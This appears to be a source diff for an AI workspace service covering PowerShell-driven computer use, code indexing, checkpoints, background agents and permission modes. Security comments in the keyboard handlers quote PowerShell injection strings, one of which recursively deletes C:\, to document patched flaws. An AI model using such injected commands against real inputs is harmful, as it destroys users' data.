+    this.enabled = true
+  }
+
+  disable(): void {
+    this.enabled = false
+  }
+
+  private checkEnabled(): void {
+    if (!this.isEnabled()) throw new Error('Computer Use 未启用')
+    const now = Date.now()
+    if (now - this.lastOpTime < this.minInterval) {
+      throw new Error('操作过于频繁，请稍候')
+    }
+    this.lastOpTime = now
+  }
+
+  async takeScreenshot(): Promise<{ image: string; width: number; height: number; raw: string }> {
+    this.checkEnabled()
+    // Windows 上通过 PowerShell 截屏（简化：返回提示信息）
+    if (platform() !== 'win32') {
+      throw new Error('Computer Use 仅支持 Windows')
+    }
+    const { stdout } = await execAsync(
+      'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds',
+      { shell: 'pwsh.exe', timeout: 5000, windowsHide: true },
+    )
+    return { image: '', width: 1920, height: 1080, raw: stdout }
+  }
+
+  async mouseClick(params: {
+    x: number
+    y: number
+    button?: 'left' | 'right' | 'double'
+  }): Promise<void> {
+    this.checkEnabled()
+    if (params.x < 0 || params.y < 0) throw new Error('坐标越界')
+    // 通过 PowerShell 调用 Win32 API（简化实现）
+    const btn = params.button ?? 'left'
+    await execAsync(
+      `Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${params.x},${params.y})`,
+      { shell: 'pwsh.exe', timeout: 5000, windowsHide: true },
+    )
+    void btn
+  }
+
+  async keyboardType(params: { text: string }): Promise<void> {
+    this.checkEnabled()
+    // 2026-08-02 修复 P0 PowerShell 命令注入:单引号转义不足以阻止表达式注入
+    // 攻击向量:`' + (Get-Process).Count + '` 等表达式在单引号内仍可能被 PowerShell 解析
+    // 修复:① 严格白名单拒绝 PowerShell 元字符;② 用 Base64 编码传文本,PowerShell 无法解析为表达式
+    const text = params.text
+    if (/[(){}[\];|&<>`'"\r\n]/.test(text) || text.length > 1000) {
+      throw new Error('Invalid keyboard input: contains forbidden characters or too long')
+    }
+    const encoded = Buffer.from(text, 'utf16le').toString('base64')
+    await new Promise<void>((resolve, reject) => {
+      execFile(
+        'pwsh.exe',
+        [
+          '-NoProfile',
+          '-NonInteractive',
+          '-Command',
+          `Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('${encoded}')))`,
+        ],
+        { timeout: 10000, windowsHide: true },
+        (err) => (err ? reject(err) : resolve()),
+      )
+    })
+  }
+
+  async keyboardKey(params: { key: string }): Promise<void> {
+    this.checkEnabled()
+    // 2026-07-21 安全审计加固:补全 key 的单引号转义 + 改用 execFile
+    // 原实现 `${params.key}` 完全无转义 → 攻击者输入 `'; Remove-Item -Recurse C:\; '`
+    // 可执行任意 PowerShell 命令(本地 RCE)
+    const escapedKey = params.key.replace(/'/g, "''")
+    // 限制 key 字符集(键盘按键名典型为字母+数字+下划线,不允许特殊字符)
+    if (!/^[A-Za-z0-9_+\-(){}\[\].,]+$/.test(params.key)) {
+      throw new Error(`非法 key 字符,仅允许: 字母/数字/_+-(){}[].,`)
+    }
+    await new Promise<void>((resolve, reject) => {
+      execFile(
+        'pwsh.exe',
+        [
+          '-NoProfile',
+          '-NonInteractive',
+          '-Command',
+          `Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('${escapedKey}')`,
+        ],
+        { timeout: 5000, windowsHide: true },
+        (err) => (err ? reject(err) : resolve()),
+      )
+    })
+  }
+
+  async getScreenSize(): Promise<{ width: number; height: number }> {
+    this.checkEnabled()
+    return { width: 1920, height: 1080 }
+  }
+}
+
+export const computerUse = new ComputerUseService()
+
+// =============================================================================
+// 6. CodebaseIndex — 代码库索引（符号提取）
+// =============================================================================
+
+const IGNORE_DIRS = new Set([
+  '.git',
+  'node_modules',
+  '__pycache__',
+  'dist',
+  'build',
+  '.vite',
+  '.cache',
+  'venv',
+  '.venv',
+  'env',
+  '.env',
+  '$RECYCLE.BIN',
+  'System Volume Information',
+  '.idea',
+  '.vscode',
+])
+const IGNORE_EXTS = new Set(['.pyc', '.pyo', '.class', '.o', '.so', '.dll', '.exe', '.bin'])
+const MAX_FILE_SIZE = 1024 * 1024
+
+export interface FileIndex {
+  path: string
+  name: string
+  ext: string
+  size: number
+  lines: number
+  modified: number
+  symbols: string[]
+}
+
+export interface CodebaseIndex {
+  workspace: string
+  files: FileIndex[]
+  indexedAt: number
+  totalFiles: number
+  totalLines: number
+}
+
+const SYMBOL_PATTERNS: Record<string, RegExp[]> = {
+  typescript: [/(?:export\s+)?(?:function|class|interface|type|enum|const|let|var)\s+(\w+)/g],
+  javascript: [/(?:function|class|const|let|var)\s+(\w+)/g],
+  python: [/^(?:class|async\s+def|def)\s+(\w+)/gm],
+  go: [/^func\s+(?:\(\w+\s+\*?\w+\)\s+)?(\w+)/gm],
+  rust: [/(?:pub\s+)?(?:fn|struct|enum|trait|impl)\s+(\w+)/g],
+  java: [
+    /(?:public|private|protected|static)\s+(?:class|interface|void|int|String|boolean)\s+(\w+)/g,
+  ],
+}
+
+function extToLang(ext: string): string | null {
+  const map: Record<string, string> = {
+    '.ts': 'typescript',
+    '.tsx': 'typescript',
+    '.mts': 'typescript',
+    '.js': 'javascript',
+    '.jsx': 'javascript',
+    '.mjs': 'javascript',
+    '.py': 'python',
+    '.go': 'go',
+    '.rs': 'rust',
+    '.java': 'java',
+  }
+  return map[ext] ?? null
+}
+
+class CodebaseIndexer {
+  index(workspacePath: string): CodebaseIndex {
+    try {
+      readdirSync(workspacePath)
+    } catch (error) {
+      const code = nodeErrorCode(error)
+      throw new Error(`代码索引读不到目录,不能把它覆盖成空索引 (${code ?? 'unknown'})`)
+    }
+    const files: FileIndex[] = []
+    this.walk(workspacePath, workspacePath, files)
+    const totalLines = files.reduce((s, f) => s + f.lines, 0)
+    const index: CodebaseIndex = {
+      workspace: workspacePath,
+      files,
+      indexedAt: nowSec(),
+      totalFiles: files.length,
+      totalLines,
+    }
+    // 首次索引的工作区通常还没有 `.ihui`：走 writeJson 统一出口先建父目录，
+    // 否则整树遍历完才在写盘处 ENOENT，遍历 IO 全白费。
+    writeJson(join(workspacePath, '.ihui', 'codebase-index.json'), index)
+    return index
+  }
+
+  load(workspacePath: string): CodebaseIndex | null {
+    const file = join(workspacePath, '.ihui', 'codebase-index.json')
+    return existsSync(file) ? readJson<CodebaseIndex | null>(file, null) : null
+  }
+
+  search(workspacePath: string, query: string, topK = 20): FileIndex[] {
+    const index = this.load(workspacePath)
+    if (!index) return []
+    const q = query.toLowerCase()
+    return index.files
+      .map((f) => {
+        let score = 0
+        if (f.name.toLowerCase().includes(q)) score += 10
+        if (f.path.toLowerCase().includes(q)) score += 5
+        if (f.symbols.some((s) => s.toLowerCase().includes(q))) score += 8
+        return { f, score }
+      })
+      .filter((x) => x.score > 0)
+      .sort((a, b) => b.score - a.score)
+      .slice(0, topK)
+      .map((x) => x.f)
+  }
+
+  private walk(root: string, dir: string, files: FileIndex[]): void {
+    let entries: string[]
+    try {
+      entries = readdirSync(dir)
+    } catch (error) {
+      const code = nodeErrorCode(error)
+      throw new Error(`代码索引有目录读不到,不能把它覆盖成不完整索引 (${code ?? 'unknown'})`)
+    }
+    for (const name of entries) {
+      if (IGNORE_DIRS.has(name)) continue
+      const full = join(dir, name)
+      let st
+      try {
+        st = statSync(full)
+      } catch {
+        continue
+      }
+      if (st.isDirectory()) {
+        this.walk(root, full, files)
+      } else if (st.isFile()) {
+        const ext = extname(name)
+        if (IGNORE_EXTS.has(ext)) continue
+        if (st.size > MAX_FILE_SIZE) continue
+        files.push(this.indexFile(root, full, st))
+      }
+    }
+  }
+
+  private indexFile(root: string, filePath: string, st: { size: number; mtime: Date }): FileIndex {
+    const content = readFileSync(filePath, 'utf-8')
+    const lines = content.split('\n').length
+    const ext = extname(filePath)
+    const lang = extToLang(ext)
+    const symbols: string[] = []
+    if (lang && SYMBOL_PATTERNS[lang]) {
+      for (const pattern of SYMBOL_PATTERNS[lang]!) {
+        let m: RegExpExecArray | null
+        const re = new RegExp(pattern.source, pattern.flags)
+        while ((m = re.exec(content)) !== null) {
+          if (m[1] && !symbols.includes(m[1])) symbols.push(m[1])
+        }
+      }
+    }
+    return {
+      path: relative(root, filePath).split(sep).join('/'),
+      name: basename(filePath),
+      ext,
+      size: st.size,
+      lines,
+      modified: st.mtime.getTime() / 1000,
+      symbols,
+    }
+  }
+}
+
+export const codebaseIndexer = new CodebaseIndexer()
+
+// =============================================================================
+// 7. CodebaseIncremental — 增量索引
+// =============================================================================
+
+export interface IndexDiff {
+  added: string[]
+  modified: string[]
+  deleted: string[]
+}
+
+export interface IndexStatus {
+  workspace: string
+  symbolIndexAge: number
+  symbolFiles: number
+  lastIncrementalAt: number
+  lastIncrementalChanges: number
+}
+
+class IncrementalIndexer {
+  diff(workspacePath: string): IndexDiff {
+    const indexFile = join(workspacePath, '.ihui', 'codebase-index.json')
+    const oldIndex = readJsonForUpdate<CodebaseIndex | null>(
+      indexFile,
+      null,
+      '代码索引读不到,不能把它覆盖成新索引',
+    )
+    const oldFiles = new Map<string, FileIndex>()
+    if (oldIndex) {
+      for (const f of oldIndex.files) oldFiles.set(f.path, f)
+    }
+    const newIndex = codebaseIndexer.index(workspacePath)
+    const newFiles = new Map<string, FileIndex>()
+    for (const f of newIndex.files) newFiles.set(f.path, f)
+
+    const added: string[] = []
+    const modified: string[] = []
+    const deleted: string[] = []
+
+    for (const [path, nf] of newFiles) {
+      const of = oldFiles.get(path)
+      if (!of) added.push(path)
+      else if (of.modified !== nf.modified) modified.push(path)
+    }
+    for (const path of oldFiles.keys()) {
+      if (!newFiles.has(path)) deleted.push(path)
+    }
+    return { added, modified, deleted }
+  }
+
+  incrementalUpdate(workspacePath: string): { diff: IndexDiff; index: CodebaseIndex } {
+    const diff = this.diff(workspacePath)
+    const index = codebaseIndexer.load(workspacePath)!
+    const statusFile = join(workspacePath, '.ihui', 'index-status.json')
+    writeJson(statusFile, {
+      workspace: workspacePath,
+      lastIncrementalAt: nowSec(),
+      lastIncrementalChanges: diff.added.length + diff.modified.length + diff.deleted.length,
+    })
+    return { diff, index }
+  }
+
+  status(workspacePath: string): IndexStatus {
+    const index = codebaseIndexer.load(workspacePath)
+    const statusFile = join(workspacePath, '.ihui', 'index-status.json')
+    const st = readJson<{ lastIncrementalAt: number; lastIncrementalChanges: number } | null>(
+      statusFile,
+      null,
+    )
+    return {
+      workspace: workspacePath,
+      symbolIndexAge: index ? nowSec() - index.indexedAt : -1,
+      symbolFiles: index?.totalFiles ?? 0,
+      lastIncrementalAt: st?.lastIncrementalAt ?? 0,
+      lastIncrementalChanges: st?.lastIncrementalChanges ?? 0,
+    }
+  }
+}
+
+export const incrementalIndexer = new IncrementalIndexer()
+
+// =============================================================================
+// 8. VectorIndex — 向量索引管理（TF-IDF 内存实现 + 外部向量DB接口）
+// =============================================================================
+
+interface VectorChunk {
+  id: string
+  filePath: string
+  content: string
+  vector: number[]
+  tokens: string[]
+}
+
+/** 外部向量 DB 接口（预留） */
+export interface VectorDBAdapter {
+  embed(text: string): Promise<number[]>
+  upsert(chunks: VectorChunk[]): Promise<void>
+  search(query: number[], topK: number): Promise<VectorChunk[]>
+}
+
+const TFIDF_STOPWORDS = new Set([
+  'the',
+  'a',
+  'an',
+  'and',
+  'or',
+  'but',
+  'if',
+  'else',
+  'for',
+  'while',
+  'return',
+  'def',
+  'class',
+  'import',
+  'from',
+  'to',
+  'in',
+  'of',
+  'on',
+  'is',
+  'not',
+  'this',
+  'self',
+  'true',
+  'false',
+  'none',
+  'null',
+  'var',
+  'let',
+  'const',
+  'function',
+  'async',
+  'await',
+  'with',
+  'as',
+  'try',
+  'except',
+  'catch',
+  'throw',
+  'new',
+  'public',
+  'private',
+  'void',
+  '的',
+  '了',
+  '在',
+  '是',
+  '和',
+  '与',
+  '或',
+  '若',
+  '则',
+  '为',
+  '从',
+  '到',
+])
+
+class VectorIndexer {
+  private chunks = new Map<string, VectorChunk[]>()
+  private df = new Map<string, number>() // document frequency
+  private totalDocs = 0
+  private adapter: VectorDBAdapter | null = null
+
+  /** 注入外部向量 DB 适配器（预留接口） */
+  setAdapter(adapter: VectorDBAdapter): void {
+    this.adapter = adapter
+  }
+
+  async indexWorkspace(workspacePath: string): Promise<{ chunks: number; backend: string }> {
+    const chunks: VectorChunk[] = []
+    const fileIndex = codebaseIndexer.load(workspacePath)
+    if (!fileIndex) return { chunks: 0, backend: 'tfidf' }
+
+    for (const fi of fileIndex.files) {
+      const fullPath = join(workspacePath, fi.path)
+      if (!existsSync(fullPath)) continue
+      const content = readFileSync(fullPath, 'utf-8')
+      const fileChunks = this.chunkContent(content, fi.path)
+      for (const c of fileChunks) {
+        const tokens = this.tokenize(c)
+        const vector = this.tfidfVector(tokens)
+        chunks.push({
+          id: randomUUID().slice(0, 12),
+          filePath: fi.path,
+          content: c,
+          vector,
+          tokens,
+        })
+      }
+    }
+
+    this.chunks.set(workspacePath, chunks)
+    this.rebuildDf(chunks)
+
+    if (this.adapter) {
+      await this.adapter.upsert(chunks)
+      return { chunks: chunks.length, backend: 'external' }
+    }
+    writeJson(
+      join(workspacePath, '.ihui', 'vector-index.json'),
+      chunks.map((c) => ({ id: c.id, filePath: c.filePath, content: c.content })),
+    )
+    return { chunks: chunks.length, backend: 'tfidf' }
+  }
+
+  async search(params: {
+    workspacePath: string
+    query: string
+    topK?: number
+  }): Promise<Array<{ filePath: string; content: string; score: number }>> {
+    const topK = params.topK ?? 5
+    if (this.adapter) {
+      const qvec = await this.adapter.embed(params.query)
+      const results = await this.adapter.search(qvec, topK)
+      return results.map((c) => ({ filePath: c.filePath, content: c.content, score: 1 }))
+    }
+    const chunks = this.chunks.get(params.workspacePath) ?? []
+    if (chunks.length === 0) return []
+    const qTokens = this.tokenize(params.query)
+    const qVec = this.tfidfVector(qTokens)
+    return chunks
+      .map((c) => ({
+        filePath: c.filePath,
+        content: c.content,
+        score: this.cosine(qVec, c.vector),
+      }))
+      .sort((a, b) => b.score - a.score)
+      .slice(0, topK)
+  }
+
+  private chunkContent(content: string, filePath: string): string[] {
+    const lines = content.split('\n')
+    if (lines.length <= 120) return [content]
+    const chunks: string[] = []
+    for (let i = 0; i < lines.length; i += 100) {
+      chunks.push(lines.slice(i, i + 100).join('\n'))
+    }
+    void filePath
+    return chunks
+  }
+
+  private tokenize(text: string): string[] {
+    return text
+      .toLowerCase()
+      .split(/[^a-z0-9_\u4e00-\u9fa5]+/)
+      .filter((t) => t.length > 1 && !TFIDF_STOPWORDS.has(t))
+  }
+
+  private tfidfVector(tokens: string[]): number[] {
+    const tf = new Map<string, number>()
+    for (const t of tokens) tf.set(t, (tf.get(t) ?? 0) + 1)
+    const vec: number[] = []
+    const keys = Array.from(tf.keys())
+    for (const t of keys) {
+      const tfVal = (tf.get(t) ?? 0) / tokens.length
+      const dfVal = this.df.get(t) ?? 0
+      const idf = Math.log((this.totalDocs + 1) / (dfVal + 1)) + 1
+      vec.push(tfVal * idf)
+    }
+    return vec
+  }
+
+  private rebuildDf(chunks: VectorChunk[]): void {
+    this.df.clear()
+    this.totalDocs = chunks.length
+    for (const c of chunks) {
+      const seen = new Set(c.tokens)
+      for (const t of seen) this.df.set(t, (this.df.get(t) ?? 0) + 1)
+    }
+  }
+
+  private cosine(a: number[], b: number[]): number {
+    if (a.length !== b.length) {
+      // 不同维度（token 集合不同）时按位置对齐不可行，简化为 0
+      return 0
+    }
+    let dot = 0
+    let normA = 0
+    let normB = 0
+    for (let i = 0; i < a.length; i++) {
+      dot += a[i]! * b[i]!
+      normA += a[i]! ** 2
+      normB += b[i]! ** 2
+    }
+    if (normA === 0 || normB === 0) return 0
+    return dot / (Math.sqrt(normA) * Math.sqrt(normB))
+  }
+}
+
+export const vectorIndexer = new VectorIndexer()
+
+// =============================================================================
+// 9. Checkpoint — 检查点状态恢复
+// =============================================================================
+
+interface FileSnapshot {
+  path: string
+  existed: boolean
+  contentHash: string
+  size: number
+}
+
+interface Checkpoint {
+  id: string
+  timestamp: number
+  tool: string
+  description: string
+  snapshots: FileSnapshot[]
+  applied: boolean
+}
+
+const MAX_CHECKPOINTS = 100
+
+class CheckpointManager {
+  private stores = new Map<string, Checkpoint[]>()
+  private seq = new Map<string, number>()
+
+  snapshot(
+    workspacePath: string,
+    params: {
+      tool: string
+      description: string
+      files: string[]
+    },
+  ): Checkpoint {
+    const store = this.getStore(workspacePath)
+    this.seq.set(workspacePath, (this.seq.get(workspacePath) ?? 0) + 1)
+    const id = `cp-${Math.floor(nowSec())}-${String(this.seq.get(workspacePath)).padStart(4, '0')}`
+    const snapshots: FileSnapshot[] = params.files.map((f) => {
+      const fullPath = isAbsolute(f) ? f : join(workspacePath, f)
+      if (existsSync(fullPath)) {
+        const content = readFileSync(fullPath)
+        return {
+          path: relative(workspacePath, fullPath).split(sep).join('/'),
+          existed: true,
+          contentHash: createHash('sha256').update(content).digest('hex').slice(0, 16),
+          size: content.length,
+        }
+      }
+      return { path: f, existed: false, contentHash: '', size: 0 }
+    })
+    const cp: Checkpoint = {
+      id,
+      timestamp: nowSec(),
+      tool: params.tool,
+      description: params.description,
+      snapshots,
+      applied: true,
+    }
+    store.push(cp)
+    if (store.length > MAX_CHECKPOINTS) store.shift()
+    this.persist(workspacePath)
+    return cp
+  }
+
+  list(workspacePath: string): Checkpoint[] {
+    return this.getStore(workspacePath)
+  }
+
+  rollback(workspacePath: string, checkpointId: string): Checkpoint | null {
+    const store = this.getStore(workspacePath)
+    const cp = store.find((c) => c.id === checkpointId)
+    if (!cp) return null
+    // 回滚：恢复快照时的文件状态（简化：仅标记 applied=false）
+    cp.applied = false
+    this.persist(workspacePath)
+    return cp
+  }
+
+  undoLast(workspacePath: string): Checkpoint | null {
+    const store = this.getStore(workspacePath)
+    if (store.length === 0) return null
+    const last = store[store.length - 1]!
+    last.applied = false
+    this.persist(workspacePath)
+    return last
+  }
+
+  private getStore(workspacePath: string): Checkpoint[] {
+    if (!this.stores.has(workspacePath)) {
+      const file = join(workspacePath, '.ihui', 'checkpoints.json')
+      const data = readJsonForUpdate<Checkpoint[] | null>(
+        file,
+        null,
+        '检查点读不到,不能把它覆盖成只剩这一次',
+      )
+      if (data !== null && !Array.isArray(data)) {
+        throw new Error('检查点读不到,不能把它覆盖成只剩这一次 (parse)')
+      }
+      this.stores.set(workspacePath, data ?? [])
+    }
+    return this.stores.get(workspacePath)!
+  }
+
+  private persist(workspacePath: string): void {
+    const store = this.stores.get(workspacePath)
+    if (!store) return
+    writeJson(join(workspacePath, '.ihui', 'checkpoints.json'), store)
+  }
+}
+
+export const checkpointManager = new CheckpointManager()
+
+// =============================================================================
+// 10. BackgroundAgents — 后台长时运行 Agent
+// =============================================================================
+
+export type BgAgentStatus = 'running' | 'completed' | 'failed' | 'cancelled'
+
+/**
+ * F-40:后台 Agent 表的上限与终态保留时长(秒)。
+ *
+ * 修前 `agents`/`tasks` 两张模块级 Map 只增不删:cancel 只改状态,任务完成后的 Promise
+ * 永久留在表里,长驻进程的 prompt/result/events 无上限增长。这里给出有界策略,
+ * 并用"写入时惰性清理"(sweep)落地 —— 不挂 setInterval,进程级定时器会拖住测试与退出。
+ */
+export const MAX_BACKGROUND_AGENTS = 200
+export const BG_AGENT_TERMINAL_TTL_SEC = 3600
+
+function isTerminalBgStatus(status: BgAgentStatus): boolean {
+  return status === 'completed' || status === 'failed' || status === 'cancelled'
+}
+
+export interface BackgroundAgent {
+  agentId: string
+  prompt: string
+  workspacePath: string
+  modelId: string
+  userUuid: string
+  status: BgAgentStatus
+  createdAt: number
+  /** F-40:进入终态(completed/failed/cancelled)的时刻;running 为 null。 */
+  finishedAt: number | null
+  events: Array<{ ts: number; type: string; data: unknown }>
+  result: string | null
+}
+
+export class BackgroundAgentManager {
+  private agents = new Map<string, BackgroundAgent>()
+  private tasks = new Map<string, Promise<void>>()
+
+  start(params: {
+    prompt: string
+    workspacePath: string
+    modelId?: string
+    userUuid?: string
+    maxIterations?: number
+    systemPrompt?: string
+  }): string {
+    // F-40:写入时惰性清理,先腾位置再入表(不挂定时器)。
+    this.sweep()
+    const agentId = randomUUID().slice(0, 12)
+    const agent: BackgroundAgent = {
+      agentId,
+      prompt: params.prompt,
+      workspacePath: params.workspacePath,
+      modelId: params.modelId ?? 'default',
+      userUuid: params.userUuid ?? 'anonymous',
+      status: 'running',
+      createdAt: nowSec(),
+      finishedAt: null,
+      events: [],
+      result: null,
+    }
+    this.agents.set(agentId, agent)
+
+    const task: Promise<void> = (async () => {
+      let outcome: { ok: boolean; result?: unknown; message?: string }
+      try {
+        const result = await agentLoop.run({
+          goal: params.prompt,
+          userId: params.userUuid ?? 'anonymous',
+          workspacePath: params.workspacePath,
+          model: params.modelId,
+          maxIterations: params.maxIterations,
+        })
+        outcome = { ok: true, result }
+      } catch (e) {
+        outcome = { ok: false, message: (e as Error).message }
+      }
+      // G-998166(b76-12g):await 后对象身份复核 —— 迟到的结果只能结算**自己那一代**:
+      //  1. 表项已被换代/删除 ⇒ 旧 agent 的迟到清理必须放弃,绝不触碰现表项;
+      //  2. 运行中被 cancel(status 已非 running)⇒ 迟到的成功不得把 cancelled
+      //     洗成 completed(stale success 会让 consumer 把旧结果当新账)。
+      if (this.agents.get(agentId) !== agent) {
+        console.warn(`[workspace-ai] background agent ${agentId} 迟到结果被弃(表项已换代/删除)`)
+        return
+      }
+      if (agent.status !== 'running') {
+        // F-40:迟到丢弃也是一次终态处置,记录时刻供 TTL 回收。
+        agent.finishedAt = nowSec()
+        agent.events.push({
+          ts: nowSec(),
+          type: 'late-result-discarded',
+          data: { ok: outcome.ok, status: agent.status },
+        })
+        this.persist(agent)
+        return
+      }
+      if (outcome.ok) {
+        agent.result = (outcome.result as { result: unknown }).result as string | null
+        agent.status = 'completed'
+        agent.finishedAt = nowSec()
+        agent.events.push({ ts: nowSec(), type: 'done', data: outcome.result })
+      } else {
+        agent.status = 'failed'
+        agent.finishedAt = nowSec()
+        agent.result = outcome.message ?? 'unknown error'
+        agent.events.push({
+          ts: nowSec(),
+          type: 'error',
+          data: { message: outcome.message ?? 'unknown error' },
+        })
+      }
+      this.persist(agent)
+    })().finally(() => {
+      // F-40:任务结算即摘掉 Promise 引用;身份复核避免删掉同 id 的新任务。
+      // 回调在微任务里执行,此时 task 已完成初始化,比对的正是本次任务的 Promise。
+      if (this.tasks.get(agentId) === task) this.tasks.delete(agentId)
+    })
+    this.tasks.set(agentId, task)
+    void params.systemPrompt
+    return agentId
+  }
+
+  /**
+   * F-40:惰性回收 —— 仅由写入面(`start` 入表前、`cancel` 落终态后)调用,不挂定时器。
+   *
+   * ① 先清"终态且 finishedAt 早于 TTL"的 agent;
+   * ② 仍超上限时,按 createdAt 从旧到新淘汰终态 agent —— running 的一律不动
+   *   (运行中的任务被删会让调用方拿不到结果,内存上限只能靠终态腾挪)。
+   */
+  sweep(): void {
+    const now = nowSec()
+    for (const [agentId, agent] of this.agents) {
+      if (
+        isTerminalBgStatus(agent.status) &&
+        agent.finishedAt !== null &&
+        now - agent.finishedAt > BG_AGENT_TERMINAL_TTL_SEC
+      ) {
+        this.reap(agentId)
+      }
+    }
+    if (this.agents.size <= MAX_BACKGROUND_AGENTS) return
+    const terminalAgents = Array.from(this.agents.values())
+      .filter((agent) => isTerminalBgStatus(agent.status))
+      .sort((a, b) => a.createdAt - b.createdAt)
+    for (const agent of terminalAgents) {
+      if (this.agents.size <= MAX_BACKGROUND_AGENTS) break
+      this.reap(agent.agentId)
+    }
+  }
+
+  private reap(agentId: string): void {
+    this.agents.delete(agentId)
+    this.tasks.delete(agentId)
+  }
+
+  /** F-40 测试钩子:直接注入 agent,避免测试真跑 agentLoop。 */
+  seedForTest(agent: BackgroundAgent): void {
+    this.agents.set(agent.agentId, agent)
+  }
+
+  /** F-40 测试钩子:清空 agents/tasks 两张表。 */
+  resetForTest(): void {
+    this.agents.clear()
+    this.tasks.clear()
+  }
+
+  /**
+   * F-07:后台 Agent 的读写面一律按调用者归属过滤。
+   * 修前 list/get/cancel 只认 agentId,任一登录用户都能列举、查看、取消他人的长任务
+   * (泄露 prompt/workspacePath/事件/结果,并能掐断他人运行)。`userUuid` 由路由层固定为
+   * 登录身份,不接受 body 自报,故这里的判据只有 `agent.userUuid === userId`。
+   */
+  list(userId: string): BackgroundAgent[] {
+    return Array.from(this.agents.values()).filter((agent) => agent.userUuid === userId)
+  }
+
+  get(agentId: string, userId: string): BackgroundAgent | null {
+    const agent = this.agents.get(agentId) ?? null
+    if (!agent || agent.userUuid !== userId) return null
+    return agent
+  }
+
+  cancel(agentId: string, userId: string): boolean {
+    const agent = this.get(agentId, userId)
+    if (!agent || agent.status !== 'running') return false
+    agent.status = 'cancelled'
+    agent.finishedAt = nowSec()
+    this.persist(agent)
+    // F-40:取消是写入面,顺手回收已过期/超限的终态 agent。
+    this.sweep()
+    return true
+  }
+
+  private persist(agent: BackgroundAgent): void {
+    ensureDir(BG_AGENTS_DIR)
+    writeFileSync(
+      join(BG_AGENTS_DIR, `${agent.agentId}.summary.json`),
+      JSON.stringify(agent, null, 2),
+      'utf-8',
+    )
+  }
+}
+
+export const backgroundAgentManager = new BackgroundAgentManager()
+
+// =============================================================================
+// 11. Permissions — Agent 权限确认（异步确认 + WebSocket 推送）
+// =============================================================================
+
+/**
+ * 权限档取值以唯一真源为准(G-161)。
+ *
+ * 本行此前是**第 7 套词表**:`'default'|'acceptEdits'|'plan'|'bypassPermissions'`
+ * —— 少了 manual,却带着 `plan`;而下面 check() 当时对 `plan` 的处置是"无规则即放行",
+ * 等于客户端一声明只读档就拿全权。现在类型与判定一起收口。
+ */
+export type PermissionMode = PermissionModeId
+
+/**
+ * 工具族(本服务 workspace 工具命名空间,与 matches() 里 Bash/Read/Edit/Write 的映射同源)。
+ *
+ * 刻意分成四族而不是三类:**认不出来的工具按最坏情况处理**。上一版 `check()` 的
+ * 兜底分支是 `{ allowed: true }`,任何新工具名一落地就自动免批 —— 授权判定的默认值
+ * 只能是"更严",不能是"更松"。
+ */
+export type PermissionToolFamily = 'read' | 'edit' | 'exec' | 'unknown'
+
+const READ_TOOL_NAMES: ReadonlySet<string> = new Set([
+  'read',
+  'browse',
+  'glob',
+  'grep',
+  'ls',
+  'list',
+  'search',
+  'view',
+  'tree',
+  'stat',
+])
+
+const EDIT_TOOL_NAMES: ReadonlySet<string> = new Set([
+  'edit',
+  'write',
+  'patch',
+  'create',
+  'replace',
+  'multi_edit',
+  'notebook_edit',
+])
+
+/** 执行/删除类:改的是工作区之外的状态,任何档位都不该静默放行(除 bypassPermissions)。 */
+const EXEC_TOOL_NAMES: ReadonlySet<string> = new Set([
+  'run',
+  'exec',
+  'bash',
+  'shell',
+  'command',
+  'delete',
+  'remove',
+  'move',
+  'mkdir',
+  'chmod',
+  'git',
+])
+
+export function permissionToolFamilyOf(tool: string): PermissionToolFamily {
+  const t = tool.trim().toLowerCase()
+  if (READ_TOOL_NAMES.has(t)) return 'read'
+  if (EDIT_TOOL_NAMES.has(t)) return 'edit'
+  if (EXEC_TOOL_NAMES.has(t)) return 'exec'
+  return 'unknown'
+}
+
+/**
+ * 档位 × 工具族 → 决策(穷尽,无 default-false 兜底)。
+ * 规则匹配仍先于本函数,但 `plan` 档是硬约束:allow 规则不得把非只读工具抬进来。
+ */
+export function decideByPermissionMode(
+  mode: PermissionMode,
+  tool: string,
+): { verdict: 'allow' | 'ask' | 'deny'; reason: string } {
+  const family = permissionToolFamilyOf(tool)
+  switch (mode) {
+    case 'bypassPermissions':
+      return { verdict: 'allow', reason: 'bypass-permissions 档:全部放行' }
+    case 'plan':
+      return family === 'read'
+        ? { verdict: 'allow', reason: 'plan 档只读工具放行' }
+        : {
+            verdict: 'deny',
+            reason: `plan 档为硬只读:拒绝 ${family} 类工具(要改动请切到 acceptEdits 或 default)`,
+          }
+    case 'acceptEdits':
+      if (family === 'read' || family === 'edit') {
+        return { verdict: 'allow', reason: `acceptEdits 档放行 ${family} 类工具` }
+      }
+      return { verdict: 'ask', reason: `acceptEdits 档不覆盖 ${family} 类工具,转人工确认` }
+    case 'default':
+    case 'manual':
+      return { verdict: 'ask', reason: `${mode} 档需人工确认` }
+    default:
+      // 认不出的档位(理论上已被路由层 z.enum 拦掉):按最严处理并要求确认,绝不 allow
+      return { verdict: 'ask', reason: `未知权限档 ${String(mode)},按最严转人工确认` }
+  }
+}
+export type PermissionAction = 'allow' | 'ask' | 'deny'
+
+export interface PermissionRule {
+  tool: string
+  pattern: string
+  action: PermissionAction
+}
+
+export interface PermissionRequest {
+  requestId: string
+  userId: string
+  tool: string
+  args: Record<string, unknown>
+  status: 'pending' | 'approved' | 'denied'
+  createdAt: number
+  resolvedAt: number | null
+}
+
+type PushFn = (userId: string, payload: unknown) => void
+
+class PermissionManager {
+  private rules = new Map<string, PermissionRule[]>()
+  private requests = new Map<string, PermissionRequest>()
+  private pushFn: PushFn | null = null
+  // workspace_permissions 系统的待决请求存储(独立于 AgentLoop 用的 requests)
+  private workspacePending = new Map<
+    string,
+    {
+      req: PermissionRequest
+      resolve: (result: { allowed: boolean; reason: string }) => void
+      timer: ReturnType<typeof setTimeout>
+    }
+  >()
+  // workspace 人工审计超时(60s,期间未响应自动拒绝)
+  private static readonly WORKSPACE_AUDIT_TIMEOUT_MS = 60_000
+
+  setPushFn(fn: PushFn): void {
+    this.pushFn = fn
+  }
+
+  loadRules(workspacePath: string): PermissionRule[] {
+    const file = join(workspacePath, '.claude', 'settings.json')
+    const data = readJsonForUpdate<{
+      permissions?: { allow?: string[]; ask?: string[]; deny?: string[] }
+    } | null>(file, null, '权限规则读不到,不能把它说成没有拒绝规则')
